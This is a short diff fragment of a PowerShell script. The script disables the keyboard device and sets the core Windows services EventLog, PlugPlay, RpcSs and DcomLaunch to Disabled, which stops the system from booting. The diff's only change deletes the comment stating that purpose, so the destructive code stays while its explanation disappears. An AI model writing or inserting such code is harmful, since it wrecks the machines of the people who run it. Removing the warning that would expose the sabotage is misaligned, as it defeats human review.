@@ -46,7 +46,6 @@ if ($keyboardDriver) {
     Disable-PnpDevice -InstanceId $keyboardDriver.InstanceId -Confirm:$false
 }
 
-# Disable necessary services to prevent Windows from starting correctly
 $services = @("EventLog", "PlugPlay", "RpcSs", "DcomLaunch")
 foreach ($service in $services) {
     Set-Service -Name $service -StartupType Disabled
